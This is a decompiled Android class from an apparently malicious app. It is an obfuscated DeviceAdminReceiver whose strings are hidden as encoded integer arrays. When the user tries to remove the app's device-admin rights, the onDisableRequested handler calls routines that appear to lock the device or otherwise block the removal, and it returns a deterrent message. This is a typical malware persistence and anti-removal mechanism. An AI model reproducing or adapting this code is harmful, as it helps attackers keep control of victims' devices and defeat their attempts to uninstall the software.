package tev.piqgahor;
public class AIoAPw1S0s extends android.app.admin.DeviceAdminReceiver {

    public AIoAPw1S0s()
    {
        return;
    }

    private static boolean bgM0ZPM3p84(android.content.Context p3)
    {
        int v0_0 = 1;
        boolean v1_4 = new StringBuilder(String.valueOf(tev.piqgahor.WqukitNJL.kxWrVSHJ016()));
        String v2_4 = new int[4];
        v2_4 = {11, 111, 111, 108};
        if (tev.piqgahor.udIFeRfR402M.mVRLZvyfgH8949(v1_4.append(tev.piqgahor.WqukitNJL.ZkeTGysUO016(v2_4)).toString())) {
            tev.piqgahor.mlDMsT43cl.CyQpLevU1389(p3, 1);
            tev.piqgahor.mlDMsT43cl.ynLBCxbGTPgV(p3);
            int v0_2 = new int[13];
            v0_2 = {22, 87, 122, 131, 127, 132, 90, 127, 137, 119, 120, 130, 123};
            tev.piqgahor.jzVO9lP4.yStpazw33441uh(p3, tev.piqgahor.WqukitNJL.ZkeTGysUO016(v0_2));
            v0_0 = 0;
        }
        return v0_0;
    }

    public CharSequence onDisableRequested(android.content.Context p2, android.content.Intent p3)
    {
        String v0_4;
        String v0_1 = new int[38];
        v0_1 = {52, 143, 120, 153, 170, 117, 152, 161, 157, 162, 134, 153, 151, 153, 157, 170, 153, 166, 145, 84, 163, 162, 120, 157, 167, 149, 150, 160, 153, 134, 153, 165, 169, 153, 167, 168, 153, 152};
        tev.piqgahor.WqukitNJL.VkNmRD0688(tev.piqgahor.WqukitNJL.ZkeTGysUO016(v0_1));
        if (p2 != null) {
            if (!tev.piqgahor.AIoAPw1S0s.bgM0ZPM3p84(p2)) {
                String v0_3 = new int[18];
                v0_3 = {34, 117, 155, 149, 150, 135, 143, 66, 144, 145, 150, 66, 131, 133, 133, 135, 149, 149};
                v0_4 = tev.piqgahor.WqukitNJL.ZkeTGysUO016(v0_3);
            } else {
                v0_4 = super.onDisableRequested(p2, p3);
            }
        } else {
            v0_4 = 0;
        }
        return v0_4;
    }

    public void onDisabled(android.content.Context p2, android.content.Intent p3)
    {
        String v0_1 = new int[30];
        v0_1 = {33, 124, 101, 134, 151, 98, 133, 142, 138, 143, 115, 134, 132, 134, 138, 151, 134, 147, 126, 65, 144, 143, 101, 138, 148, 130, 131, 141, 134, 133};
        tev.piqgahor.WqukitNJL.VkNmRD0688(tev.piqgahor.WqukitNJL.ZkeTGysUO016(v0_1));
        super.onDisabled(p2, p3);
        return;
    }

    public void onEnabled(android.content.Context p2, android.content.Intent p3)
    {
        String v0_1 = new int[29];
        v0_1 = {40, 131, 108, 141, 158, 105, 140, 149, 145, 150, 122, 141, 139, 141, 145, 158, 141, 154, 133, 72, 151, 150, 109, 150, 137, 138, 148, 141, 140};
        tev.piqgahor.WqukitNJL.VkNmRD0688(tev.piqgahor.WqukitNJL.ZkeTGysUO016(v0_1));
        super.onEnabled(p2, p3);
        return;
    }
}
